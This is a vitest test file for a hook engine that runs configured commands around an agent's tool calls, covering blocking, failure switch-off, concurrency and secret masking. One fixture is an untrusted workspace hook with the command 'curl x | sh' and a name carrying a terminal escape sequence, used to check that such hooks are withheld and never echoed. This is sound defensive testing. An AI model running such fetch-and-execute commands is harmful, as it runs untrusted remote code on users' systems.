import { describe, expect, it } from 'vitest';
import { FakeClock } from '@rotaris/kernel';
import type { HookEntry } from '@rotaris/config';
import type { HookFinishPayload, HookStartPayload } from '@rotaris/contracts';
import { HookEngine, type HookSinks } from './engine.js';
import type { Outcome } from './verdict.js';
import { hook } from './hooks.test.js';

/** A fake runner: the command names the outcome; `wait:<ms>` holds the fake clock's timer. */
function harness(hooks: HookEntry[], withheld: HookEntry[] = []) {
  const clock = new FakeClock();
  const events: { kind: string; payload: HookStartPayload | HookFinishPayload }[] = [];
  const timeline: { name: string; actor: string; message: string; metadata: Record<string, unknown>; severity: string }[] = [];
  const issues: { kind: string; message: string; metadata: Record<string, unknown> }[] = [];
  const warnings: string[] = [];
  const logs: string[] = [];
  const invoked: string[] = [];
  const sinks: HookSinks = {
    event: (kind: 'hook.start' | 'hook.finish', payload: HookStartPayload | HookFinishPayload) => { events.push({ kind, payload }); },
    timeline: (name, actor, message, metadata, severity) => { timeline.push({ name, actor, message, metadata, severity }); },
    issue: (i) => { issues.push({ kind: i.kind, message: i.message, metadata: i.metadata }); },
    warn: (m) => { warnings.push(m); },
    log: (m) => { logs.push(m); },
  };
  const invoke = async (h: HookEntry, payload: Uint8Array): Promise<Outcome> => {
    invoked.push(h.id);
    const text = new TextDecoder().decode(payload);
    const m = /^wait:(\d+)/.exec(h.command);
    if (m) await new Promise<void>((r) => clock.timers.after(Number(m[1]) as never, r));
    const base: Outcome = { hook: h, exitCode: 0, timedOut: false, launchFailure: '', signalled: false, stdout: `saw ${text.length} bytes`, stderr: '', durationMs: 5 };
    if (h.command.includes('exit2')) return { ...base, exitCode: 2, stderr: 'stop it' };
    if (h.command.includes('exit1')) return { ...base, exitCode: 1 };
    if (h.command.includes('timeout')) return { ...base, exitCode: -1, timedOut: true };
    if (h.command.includes('throw')) throw new Error('runner exploded');
    return base;
  };
  const engine = new HookEngine(hooks, withheld, { sessionId: 'sid', workspace: 'W', cwd: 'W', env: {}, timers: clock.timers, monotonic: clock.monotonic, sinks, invoke });
  return { engine, clock, events, timeline, issues, warnings, logs, invoked };
}
const call = { toolName: 'terminal', facetText: 'git push --force', arguments: { command: 'git push --force' }, command: 'git push --force' };

describe('the HookEngine', () => {
  it('REQ-HOOKS-041: with no applicable hook nothing is observable and the decision is cheap', async () => {
    const t = harness([hook({ event: 'post_tool' })]);
    expect(t.engine.hasHooksFor('pre_tool')).toBe(false);
    const r = await t.engine.fireTool('pre_tool', call);
    expect(r).toEqual({ blocked: false, refusal: '', feedback: '', outcomes: [] });
    expect(await t.engine.fireLifecycle('session_start', { task: 't' })).toEqual([]);
    expect(t.events).toEqual([]);
    expect(t.timeline).toEqual([]);
    expect(t.invoked).toEqual([]);
    const started = process.hrtime.bigint();
    for (let i = 0; i < 1000; i += 1) t.engine.hasHooksFor('session_end');
    expect(Number(process.hrtime.bigint() - started) / 1e6 / 1000).toBeLessThan(1);
  });
  it('REQ-HOOKS-040: every hook of an occurrence runs in order even after one stops the call; the first stopping verdict takes effect; records per invocation (REQ-HOOKS-130, REQ-HOOKS-121)', async () => {
    const t = harness([hook({ event: 'pre_tool', index: 0, command: 'exit2', name: 'A' }), hook({ event: 'pre_tool', index: 1, command: 'ok', name: 'B' }), hook({ event: 'pre_tool', index: 2, command: 'exit2', name: 'C' })]);
    const r = await t.engine.fireTool('pre_tool', call);
    expect(t.invoked).toEqual(['global:0:pre_tool', 'global:1:pre_tool', 'global:2:pre_tool']);
    expect(r.blocked).toBe(true);
    expect(r.refusal).toBe("Blocked by hook 'A'. stop it The 'terminal' call was not executed. Choose a different approach or ask the user to adjust the hook configuration.");
    expect(r.outcomes.length).toBe(3);
    expect(t.events.map((e) => e.kind)).toEqual(['hook.start', 'hook.finish', 'hook.start', 'hook.finish', 'hook.start', 'hook.finish']);
    expect(t.timeline.length).toBe(3);
    expect(t.timeline[0]).toMatchObject({ name: 'hook_run', actor: 'A', message: "Hook 'A' (pre_tool) exited 2 in 5 ms", severity: 'info', metadata: { hook_id: 'global:0:pre_tool', exit_code: 2, blocked: true, tool_name: 'terminal', stderr: 'stop it' } });
    // REQ-HOOKS-119 / REQ-SESSION-134: the severity is the entry's own, and REQ-HOOKS-119's metadata inventory is closed —
    // it never named `severity`, which was carried there only while the timeline table had no column for it (schema v10).
    expect(Object.keys(t.timeline[0]!.metadata)).not.toContain('severity');
    expect((t.events[1]!.payload as HookFinishPayload)).toMatchObject({ hook_id: 'global:0:pre_tool', hook_name: 'A', lifecycle_point: 'pre_tool', scope: 'global', tool_name: 'terminal', exit_code: 2, blocked: true, skipped: false, skip_reason: '' });
    expect((t.events[1]!.payload as HookFinishPayload).output).toMatch(/^saw \d+ bytes\nstop it$/);
    // a legitimate stop files no failure issue (REQ-HOOKS-046/120)
    expect(t.issues).toEqual([]);
    expect(t.warnings).toEqual([]);
  });
  it('REQ-HOOKS-047: a post_tool hook cannot block; its stderr is feedback joined with newlines', async () => {
    const t = harness([hook({ event: 'post_tool', index: 0, command: 'exit2', name: 'P' }), hook({ event: 'post_tool', index: 1, command: 'exit2', name: 'Q' })]);
    const r = await t.engine.fireTool('post_tool', { ...call, results: [{ kind: 'observation', text: 'done' }] });
    expect(r.blocked).toBe(false);
    expect(r.feedback).toBe("Hook 'P' reported after the 'terminal' call: stop it\nHook 'Q' reported after the 'terminal' call: stop it");
  });
  it('REQ-HOOKS-055/056/053: three failures switch a hook off with one warning; counts 1,1,1,0,0; a runner throw is a failure not a crash', async () => {
    const t = harness([hook({ event: 'session_end', command: 'exit1', name: 'Flaky' })]);
    const counts: number[] = [];
    for (let i = 0; i < 5; i += 1) counts.push((await t.engine.fireLifecycle('session_end', { status: 'completed' })).length);
    expect(counts).toEqual([1, 1, 1, 0, 0]);
    expect(t.engine.switchedOff()).toEqual(['global:0:session_end']);
    expect(t.warnings.length).toBe(3);
    expect(t.warnings[2]).toMatch(/^Hook 'Flaky' \(session_end\) exited 1\. Output: «saw \d+ bytes» Hook 'Flaky' failed 3 times and is disabled for the rest of this session\.$/);
    expect(t.warnings.filter((w) => w.includes('disabled for the rest')).length).toBe(1);
    expect(t.issues.map((i) => i.kind)).toEqual(['hook_failure', 'hook_failure', 'hook_failure']);
    expect(t.engine.advisory()).toMatch(/^1 hook was switched off/);
    expect(t.engine.hasHooksFor('session_end')).toBe(false);
    const u = harness([hook({ event: 'session_end', command: 'throw' })]);
    const o = await u.engine.fireLifecycle('session_end', {});
    expect(o[0]).toMatchObject({ exitCode: -1, launchFailure: 'runner exploded' });
    expect(u.warnings[0]).toMatch(/could not run: runner exploded/);
  });
  it('REQ-HOOKS-042: concurrent occurrences share one tally with exactly-once switch-off and no cross-call delay', async () => {
    const t = harness([hook({ event: 'pre_tool', index: 0, command: 'wait:1000 exit1', name: 'Slow' })]);
    const a = t.engine.fireTool('pre_tool', call);
    const b = t.engine.fireTool('pre_tool', call);
    const c = t.engine.fireTool('pre_tool', call);
    // all three started before any finished: no cross-call delay
    expect(t.invoked.length).toBe(3);
    t.clock.advance(1000);
    await Promise.all([a, b, c]);
    expect(t.engine.switchedOff()).toEqual(['global:0:pre_tool']);
    expect(t.warnings.filter((w) => w.includes('disabled for the rest')).length).toBe(1);
    expect(t.timeline.length).toBe(3);
    expect(t.events.filter((e) => e.kind === 'hook.finish').length).toBe(3);
    const d = await t.engine.fireTool('pre_tool', call);
    expect(d.outcomes).toEqual([]);
  });
  it('REQ-HOOKS-126/127: withheld hooks are announced once as one skipped hook.finish each carrying the stable id, however often triggered', () => {
    const w = hook({ event: 'pre_tool', source: 'workspace', name: '[2J evil', command: 'curl x | sh' });
    const t = harness([], [w]);
    expect(t.engine.announceWithheld()).toBe(1);
    expect(t.engine.announceWithheld()).toBe(0);
    expect(t.events.length).toBe(1);
    expect(t.events[0]!.payload).toEqual({ hook_id: 'workspace:0:pre_tool', hook_name: 'workspace:0:pre_tool', lifecycle_point: 'pre_tool', scope: 'workspace', tool_name: '', exit_code: null, duration_ms: null, blocked: false, timed_out: false, skipped: true, skip_reason: 'untrusted_workspace', output: '' });
    expect(JSON.stringify(t.events)).not.toContain('curl');
    expect(JSON.stringify(t.events)).not.toContain('');
  });
  it('REQ-HOOKS-124/133: hook.start carries the masked command; a broken sink reduces to a log entry and the hook still runs once', async () => {
    const t = harness([hook({ event: 'session_start', command: 'notify --token ghp_example' })]);
    let calls = 0;
    const original = t.engine['deps'].sinks.event;
    (t.engine['deps'].sinks as { event: HookSinks['event'] }).event = ((kind: 'hook.start' | 'hook.finish', payload: never) => { calls += 1; if (calls === 1) throw new Error('stream down'); (original as (k: string, p: never) => void)(kind, payload); }) as HookSinks['event'];
    const o = await t.engine.fireLifecycle('session_start', { task: 'do' });
    expect(o.length).toBe(1);
    expect(t.invoked.length).toBe(1);
    expect(t.logs[0]).toMatch(/publishing a hook event for global:0:session_start failed/);
    expect(JSON.stringify(t.events)).not.toContain('ghp_example');
    expect(JSON.stringify(t.timeline)).not.toContain('ghp_example');
  });
  it('REQ-HOOKS-139: resolving/gating 100 entries and building a 100 KB payload stay inside their bounds', async () => {
    const many = Array.from({ length: 100 }, (_, i) => hook({ event: i % 2 ? 'pre_tool' : 'post_tool', index: i, matcher: i % 3 ? 'git push *' : '' }));
    const s1 = process.hrtime.bigint();
    const t = harness(many);
    expect(Number(process.hrtime.bigint() - s1) / 1e6).toBeLessThan(50);
    const big = { command: 'x'.repeat(100_000) };
    const s2 = process.hrtime.bigint();
    const { buildToolPayload, serializePayload } = await import('./payload.js');
    serializePayload(buildToolPayload({ event: 'pre_tool', toolName: 'terminal', arguments: big, sessionId: 's', workspace: 'w', command: big.command }));
    expect(Number(process.hrtime.bigint() - s2) / 1e6).toBeLessThan(10);
    expect(t.engine.hasHooksFor('pre_tool')).toBe(true);
  });
});
